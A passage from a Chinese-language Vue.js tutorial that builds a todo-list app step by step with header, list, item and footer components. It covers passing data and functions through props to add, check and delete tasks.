40px;</span><br><span class="line">    border: 1px solid @color-grey-d;</span><br><span class="line">    border-radius: 2px;</span><br><span class="line">    padding-left: 5px;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h5 id="MyItem-vue"><a href="#MyItem-vue" class="headerlink" title="MyItem.vue"></a><code>MyItem.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &lt;input type=&quot;checkbox&quot;&gt;</span><br><span class="line">      &lt;span&gt;xxx&lt;/span&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;button class=&quot;btn btn-danger&quot; style=&quot;display: none&quot;&gt;删除&lt;/button&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyItem&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  li &#123;</span><br><span class="line">    @color-grey-d: #ddd;</span><br><span class="line">    list-style: none;</span><br><span class="line">    height: 36px;</span><br><span class="line">    line-height: 36px;</span><br><span class="line">    padding: 0 5px;</span><br><span class="line">    border-bottom: 1px solid @color-grey-d;</span><br><span class="line"></span><br><span class="line">    label &#123;</span><br><span class="line">      float: left;</span><br><span class="line">      cursor: pointer;</span><br><span class="line"></span><br><span class="line">      li input &#123;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">        margin-right: 6px;</span><br><span class="line">        position: relative;</span><br><span class="line">        top: -1px;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    button &#123;</span><br><span class="line">      float: right;</span><br><span class="line">      display: none;</span><br><span class="line">      margin-top: 3px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;:before &#123;</span><br><span class="line">      content: initial;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;:last-child &#123;</span><br><span class="line">      border-bottom: none;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h5 id="MyFooter-vue"><a href="#MyFooter-vue" class="headerlink" title="MyFooter.vue"></a><code>MyFooter.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;todo-footer&quot;&gt;</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &lt;input type=&quot;checkbox&quot;&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">      &lt;span&gt;已完成0&lt;/span&gt;/ 全部2</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">    &lt;button class=&quot;btn btn-danger&quot;&gt;清空已完成任务&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyFooter&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  .todo-footer &#123;</span><br><span class="line">    height: 40px;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">    padding-left: 6px;</span><br><span class="line">    margin-top: 5px;</span><br><span class="line"></span><br><span class="line">    label &#123;</span><br><span class="line">      display: inline-block;</span><br><span class="line">      margin-right: 20px;</span><br><span class="line">      cursor: pointer;</span><br><span class="line"></span><br><span class="line">      input &#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        top: -1px;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">        margin-right: 5px;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    button &#123;</span><br><span class="line">      float: right;</span><br><span class="line">      margin-top: 5px;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>



<h4 id="3-11-1-2-初始化列表"><a href="#3-11-1-2-初始化列表" class="headerlink" title="3.11.1.2.初始化列表"></a>3.11.1.2.初始化列表</h4><p>实际开发中，会封装<code>ajax</code>请求调用获取数据的接口，然后展示</p>
<p><code>MyList.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ul class=&quot;todo-main&quot;&gt;</span><br><span class="line">    &lt;MyItem v-for=&quot;item in todos&quot; :key=&quot;item.id&quot; :todoObj=&quot;item&quot;&gt;&lt;/MyItem&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyItem from &#x27;./MyItem.vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyList&quot;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyItem</span><br><span class="line">        &#125;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                todos: [</span><br><span class="line">                    &#123;id:&#x27;001&#x27;,title:&#x27;吃饭&#x27;,done:true&#125;,</span><br><span class="line">                    &#123;id:&#x27;002&#x27;,title:&#x27;睡觉&#x27;,done:true&#125;,</span><br><span class="line">                    &#123;id:&#x27;003&#x27;,title:&#x27;打豆豆&#x27;,done:false&#125;,</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyItem.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &lt;input type=&quot;checkbox&quot; :checked=&quot;todoObj.done&quot;&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123;todoObj.title&#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;button class=&quot;btn btn-danger&quot; style=&quot;display: none&quot;&gt;删除&lt;/button&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyItem&quot;,</span><br><span class="line">        props: &#123;</span><br><span class="line">            todoObj: &#123;</span><br><span class="line">                type: String</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220529204122256.png" alt="image-20220529204122256"></p>
<h4 id="3-11-1-3-添加功能"><a href="#3-11-1-3-添加功能" class="headerlink" title="3.11.1.3.添加功能"></a>3.11.1.3.添加功能</h4><p>该功能涉及到父组件给子组件传值，传递<code>method</code></p>
<p>添加输入数据后，渲染时要生成唯一标识，可以使用<code>uuid</code>或<code>nanoid</code>库</p>
<p><code>npm i nanoid -D</code></p>
<p><code>MyHeader.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;todo-header&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; placeholder=&quot;请输入任务名称，回车键确认&quot; @keyup.enter=&quot;addEvent&quot; v-model=&quot;title&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import &#123;nanoid&#125; from &#x27;nanoid&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyHeader&quot;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                title: &#x27;&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        props: &#123;</span><br><span class="line">            addTodo: &#123;</span><br><span class="line">                type: Function</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            addEvent() &#123;</span><br><span class="line">                if(!this.title) return alert(&#x27;输入不能为空&#x27;)</span><br><span class="line">                // 将用户的输入，包装成对象格式（和获取到的格式保持一致）</span><br><span class="line">                const todoOjb = &#123;</span><br><span class="line">                    id: nanoid(),</span><br><span class="line">                    title: this.title,</span><br><span class="line">                    done: false</span><br><span class="line">                &#125;</span><br><span class="line">                // 通知App组件去添加一个对象</span><br><span class="line">                this.addTodo(todoOjb)</span><br><span class="line">                this.title = &#x27;&#x27;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>现在要将<code>MyHeader</code>组件的数据传递给<code>MyList</code>组件，目前我们还没学到组件间通信</p>
<p>所以目前我们先把数据都放在<code>App</code>组件，然后通过<code>props</code>配置项传给<code>MyList</code>组件</p>
<p>并且，<code>APP</code>组件要获取到<code>Header</code>组件中输入的数据，可以先在<code>App</code>组件中，定义一个函数，通过<code>props</code>传递函数给<code>Header</code>，<code>Header</code>组件在调用函数并传参时，<code>App</code>组件也可以获取到这个参数</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;todo-container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;todo-wrap&quot;&gt;</span><br><span class="line">        &lt;MyHeader :addTodo=&quot;addTodo&quot;&gt;&lt;/MyHeader&gt;</span><br><span class="line">        &lt;MyList :todos=&quot;todos&quot;&gt;&lt;/MyList&gt;</span><br><span class="line">        &lt;MyFooter&gt;&lt;/MyFooter&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyHeader from &#x27;./components/MyHeader.vue&#x27;</span><br><span class="line">    import MyList from &#x27;./components/MyList.vue&#x27;</span><br><span class="line">    import MyFooter from &#x27;./components/MyFooter.vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyHeader,</span><br><span class="line">            MyList,</span><br><span class="line">            MyFooter</span><br><span class="line">        &#125;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                todos: [</span><br><span class="line">                    &#123;id:&#x27;001&#x27;,title:&#x27;吃饭&#x27;,done:true&#125;,</span><br><span class="line">                    &#123;id:&#x27;002&#x27;,title:&#x27;睡觉&#x27;,done:true&#125;,</span><br><span class="line">                    &#123;id:&#x27;003&#x27;,title:&#x27;打豆豆&#x27;,done:false&#125;,</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            addTodo(todoObj) &#123;</span><br><span class="line">                this.todos.push(todoObj)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-11-1-4-勾选功能"><a href="#3-11-1-4-勾选功能" class="headerlink" title="3.11.1.4.勾选功能"></a>3.11.1.4.勾选功能</h4><p>该功能涉及到爷爷组件传值（父组件给儿子的儿子组件传值）</p>
<p>注意<code>MyItem</code>组件中，<code>:checked</code>是绑定的<code>props</code>的值，取消勾选需要修改<code>props</code>的值，但<code>vue</code>不建议修改，所以<code>input</code>不能写成<code>v-model</code>的形式</p>
<p><code>input</code>输入框通过<code>change</code>事件，绑定<code>List</code>组件通过<code>props</code>传的函数，而该函数又是<code>App</code>组件通过<code>props</code>传递过来的</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;todo-container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;todo-wrap&quot;&gt;</span><br><span class="line">        &lt;MyHeader :addTodo=&quot;addTodo&quot;&gt;&lt;/MyHeader&gt;</span><br><span class="line">        &lt;MyList :todos=&quot;todos&quot; :checkTodo=&quot;checkTodo&quot;&gt;&lt;/MyList&gt;</span><br><span class="line">        &lt;MyFooter&gt;&lt;/MyFooter&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyHeader from &#x27;./components/MyHeader.vue&#x27;</span><br><span class="line">    import MyList from &#x27;./components/MyList.vue&#x27;</span><br><span class="line">    import MyFooter from &#x27;./components/MyFooter.vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyHeader,</span><br><span class="line">            MyList,</span><br><span class="line">            MyFooter</span><br><span class="line">        &#125;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                todos: [</span><br><span class="line">                    &#123;id:&#x27;001&#x27;,title:&#x27;吃饭&#x27;,done:true&#125;,</span><br><span class="line">                    &#123;id:&#x27;002&#x27;,title:&#x27;睡觉&#x27;,done:true&#125;,</span><br><span class="line">                    &#123;id:&#x27;003&#x27;,title:&#x27;打豆豆&#x27;,done:false&#125;,</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            addTodo(todoObj) &#123;</span><br><span class="line">                this.todos.push(todoObj)</span><br><span class="line">            &#125;,</span><br><span class="line">            checkTodo(id) &#123;</span><br><span class="line">                // todoObj.done = !todoObj.done</span><br><span class="line">                this.todos.forEach(item =&gt; &#123;</span><br><span class="line">                    if(item.id === id) item.done = !item.done</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyList.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ul class=&quot;todo-main&quot;&gt;</span><br><span class="line">    &lt;MyItem</span><br><span class="line">            v-for=&quot;item in todos&quot;</span><br><span class="line">            :key=&quot;item.id&quot;</span><br><span class="line">            :todoObj=&quot;item&quot;</span><br><span class="line">            :checkTodo=&quot;checkTodo&quot;</span><br><span class="line">    &gt;&lt;/MyItem&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyItem from &#x27;./MyItem.vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyList&quot;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyItem</span><br><span class="line">        &#125;,</span><br><span class="line">        props: &#123;</span><br><span class="line">            todos: &#123;</span><br><span class="line">                type: Object</span><br><span class="line">            &#125;,</span><br><span class="line">            checkTodo: &#123;</span><br><span class="line">                type: Function</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyItem.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &lt;input type=&quot;checkbox&quot;</span><br><span class="line">             :checked=&quot;todoObj.done&quot;</span><br><span class="line">             @change=&quot;handleCheck(todoObj.id)&quot;&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123;todoObj.title&#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;button class=&quot;btn btn-danger&quot; style=&quot;display: none&quot;&gt;删除&lt;/button&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyItem&quot;,</span><br><span class="line">        props: &#123;</span><br><span class="line">            todoObj: &#123;</span><br><span class="line">                type: Object</span><br><span class="line">            &#125;,</span><br><span class="line">            checkTodo: &#123;</span><br><span class="line">                type: Function</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            handleCheck(id) &#123;</span><br><span class="line">              this.checkTodo(id)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-11-1-5-删除功能"><a href="#3-11-1-5-删除功能" class="headerlink" title="3.11.1.5.删除功能"></a>3.11.1.5.删除功能</h4><p>由于选择器优先级的问题，要将<code>App</code>组件中写在<code>#root</code>中的<code>.btn</code>、<code>.btn-danger</code>样式抽离到同一层级</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;todo-container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;todo-wrap&quot;&gt;</span><br><span class="line">        &lt;MyHeader :addTodo=&quot;addTodo&quot;&gt;&lt;/MyHeader&gt;</span><br><span class="line">        &lt;MyList</span><br><span class="line">            :todos=&quot;todos&quot;</span><br><span class="line">            :checkTodo=&quot;checkTodo&quot;</span><br><span class="line">            :deleteTodo=&quot;deleteTodo&quot;</span><br><span class="line">        &gt;&lt;/MyList&gt;</span><br><span class="line">        &lt;MyFooter&gt;&lt;/MyFooter&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyHeader from &#x27;./components/MyHeader.vue&#x27;</span><br><span class="line">import MyList from &#x27;./components/MyList.vue&#x27;</span><br><span class="line">import MyFooter from &#x27;./components/MyFooter.vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyHeader,</span><br><span class="line">    MyList,</span><br><span class="line">    MyFooter</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      todos: [</span><br><span class="line">        &#123;id: &#x27;001&#x27;, title: &#x27;吃饭&#x27;, done: true&#125;,</span><br><span class="line">        &#123;id: &#x27;002&#x27;, title: &#x27;睡觉&#x27;, done: true&#125;,</span><br><span class="line">        &#123;id: &#x27;003&#x27;, title: &#x27;打豆豆&#x27;, done: false&#125;,</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    addTodo(todoObj) &#123;</span><br><span class="line">      this.todos.push(todoObj)</span><br><span class="line">    &#125;,</span><br><span class="line">    checkTodo(id) &#123;</span><br><span class="line">      // todoObj.done = !todoObj.done</span><br><span class="line">      this.todos.forEach(item =&gt; &#123;</span><br><span class="line">        if (item.id === id) item.done = !item.done</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    deleteTodo(id) &#123;</span><br><span class="line">      this.todos = this.todos.filter(item =&gt; item.id !== id)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyList.vue</code></p>
